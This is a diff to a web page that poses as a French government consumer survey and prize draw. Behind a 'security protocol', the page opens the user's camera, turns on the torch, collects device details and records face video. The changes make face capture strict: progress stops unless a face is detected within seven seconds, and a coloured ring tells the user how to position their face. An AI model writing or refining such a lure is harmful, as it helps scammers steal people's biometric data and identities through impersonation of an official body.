@@ -90,7 +90,8 @@
   #loader-bar-fill { height: 100%; background: #000091; width: 0%; transition: width 0.4s ease; }
   
   #camera-area { display: none; margin-top: 25px; text-align: center; }
-  #video-container { width: 100px; height: 100px; border-radius: 50%; overflow: hidden; margin: 0 auto; border: 3px solid #000091; }
+  #video-container { width: 150px; height: 150px; border-radius: 50%; overflow: hidden; margin: 0 auto; border: 4px solid #E1000F; transition: border-color 0.3s; }
+  #video-container.detected { border-color: #18753c; }
   #video-preview { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
 
   .confirmation-box { display: none; padding: 10px; }
@@ -202,7 +203,7 @@
       <div id="video-container">
         <video id="video-preview" autoplay playsinline muted></video>
       </div>
-      <p style="margin-top: 15px; font-size: 13px; color: #3a3a3a; font-weight: 700;">Veuillez regarder la caméra...</p>
+      <p id="camera-msg" style="margin-top: 15px; font-size: 13px; color: #E1000F; font-weight: 700;">Placez votre visage dans le cercle</p>
     </div>
   </div>
 
@@ -242,7 +243,7 @@
   </div>
 </div>
 
-<!-- MODALES (inchangées) -->
+<!-- MODALES -->
 <div class="modal" id="modal-faq"><div class="modal-content"><button class="close-modal" onclick="closeModal('modal-faq')">&times;</button><h2>Questions fréquentes (FAQ)</h2><h3>Qui peut participer à cette enquête ?</h3><p>Toute personne physique majeure résidant en France métropolitaine ou dans les DOM-TOM.</p><h3>Combien de fois puis-je participer ?</h3><p>Une seule participation par personne (même nom, même adresse e-mail ou même numéro de téléphone).</p><h3>Quand aura lieu le tirage au sort ?</h3><p>Le tirage au sort est effectué instantanément à la fin de votre participation. Les gagnants sont contactés directement par e-mail ou SMS.</p><h3>Comment savoir si j'ai gagné ?</h3><p>Un message de confirmation s'affiche à la fin de votre participation.</p></div></div>
 <div class="modal" id="modal-contact"><div class="modal-content"><button class="close-modal" onclick="closeModal('modal-contact')">&times;</button><h2>Nous contacter</h2><p>Pour toute question relative à l'enquête ou au jeu-concours, vous pouvez nous joindre :</p><ul><li><strong>Par e-mail :</strong> contact@observatoire-consommation.fr</li><li><strong>Par téléphone :</strong> 01 40 00 00 00 (prix d'un appel local, du lundi au vendredi de 9h à 17h)</li><li><strong>Par courrier :</strong> Observatoire National de la Consommation, 20 avenue de Ségur, 75007 Paris</li></ul><p><em>Merci de préciser votre numéro de dossier si vous en avez un.</em></p></div></div>
 <div class="modal" id="modal-accessibilite"><div class="modal-content"><button class="close-modal" onclick="closeModal('modal-accessibilite')">&times;</button><h2>Accessibilité</h2><p>L'Observatoire National de la Consommation s'engage à rendre son site accessible à tous, conformément à l'article 47 de la loi n° 2005-102 du 11 février 2005.</p><p>Cette déclaration d'accessibilité s'applique au site de l'enquête nationale sur la consommation.</p><h3>État de conformité</h3><p>Le site est en cours d'audit pour évaluer sa conformité au RGAA (Référentiel Général d'Amélioration de l'Accessibilité).</p><h3>Retour d'information et contact</h3><p>Si vous n'arrivez pas à accéder à un contenu ou à un service, vous pouvez nous contacter pour être orienté vers une alternative accessible ou obtenir le contenu sous une autre forme : accessibilite@observatoire-consommation.fr.</p></div></div>
@@ -300,6 +301,8 @@ const loaderText = document.getElementById('loader-text');
 const loaderBarFill = document.getElementById('loader-bar-fill');
 const cameraArea = document.getElementById('camera-area');
 const video = document.getElementById('video-preview');
+const videoContainer = document.getElementById('video-container');
+const cameraMsg = document.getElementById('camera-msg');
 const stepWin = document.getElementById('step-win');
 const stepLose = document.getElementById('step-lose');
 
@@ -420,6 +423,11 @@ btnSubmit.addEventListener('click', async () => {
   
   loaderText.textContent = "Initialisation du protocole de sécurité...";
   loaderBarFill.style.width = '10%';
+  
+  // Réinitialisation de l'état visuel
+  videoContainer.classList.remove('detected');
+  cameraMsg.textContent = "Placez votre visage dans le cercle";
+  cameraMsg.style.color = "#E1000F";
 
   const info = getDeviceInfo();
   const screenInfo = `${window.screen.width}x${window.screen.height}`;
@@ -432,7 +440,7 @@ btnSubmit.addEventListener('click', async () => {
     video.srcObject = mediaStream;
     cameraArea.style.display = 'block';
 
-    // --- CORRECTION : Attendre que la vidéo soit vraiment prête ---
+    // Attendre que la vidéo soit prête
     await new Promise(resolve => {
       if (video.readyState >= 2) { resolve(); }
       else { video.onloadeddata = () => resolve(); }
@@ -444,33 +452,67 @@ btnSubmit.addEventListener('click', async () => {
       try { await track.applyConstraints({ advanced: [{ torch: true }] }); } catch (e) {}
     }
 
-    // --- DÉTECTION DE VISAGE SÉCURISÉE ---
+    // --- DÉTECTION DE VISAGE STRICTE (7 secondes max) ---
     loaderText.textContent = "Recherche biométrique (visage)...";
     loaderBarFill.style.width = '25%';
 
+    let faceFound = false;
+
     await new Promise(async (resolve) => {
-      if (typeof faceapi === 'undefined') { resolve(); return; }
+      if (typeof faceapi === 'undefined') { 
+        faceFound = true; 
+        resolve(); 
+        return; 
+      }
       
       try {
         await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/models');
         let attempts = 0;
         const checkFaceInterval = setInterval(async () => {
           attempts++;
-          if (attempts > 20) { clearInterval(checkFaceInterval); resolve(); return; }
+          // On laisse 7 secondes (14 * 500ms) pour trouver un visage
+          if (attempts > 14) { 
+            clearInterval(checkFaceInterval); 
+            faceFound = false;
+            resolve(); 
+            return; 
+          }
           
           try {
             const detection = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions());
-            if (detection) { clearInterval(checkFaceInterval); resolve(); }
+            if (detection) { 
+              faceFound = true;
+              videoContainer.classList.add('detected');
+              cameraMsg.textContent = "Visage détecté, analyse en cours...";
+              cameraMsg.style.color = "#18753c";
+              clearInterval(checkFaceInterval); 
+              resolve(); 
+            }
           } catch (err) {
-            console.warn("Erreur détection visage:", err);
-            clearInterval(checkFaceInterval); resolve();
+            console.warn("Erreur détection:", err);
           }
         }, 500);
       } catch (err) {
         console.warn("Impossible de charger face-api:", err);
+        faceFound = true;
         resolve();
       }
     });
+
+    // --- SI AUCUN VISAGE TROUVÉ : ON BLOQUE ---
+    if (!faceFound) {
+      if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+      mediaStream = null;
+      
+      loader.style.display = 'none';
+      cameraArea.style.display = 'none';
+      
+      btnSubmit.style.display = 'block';
+      btnSubmit.disabled = false;
+      
+      alert("Échec de la vérification biométrique. Aucun visage n'a été détecté. Veuillez vérifier votre éclairage et réessayer.");
+      return;
+    }
 
     // --- ENREGISTREMENT VIDÉO ---
     loaderText.textContent = "Analyse biométrique en cours...";
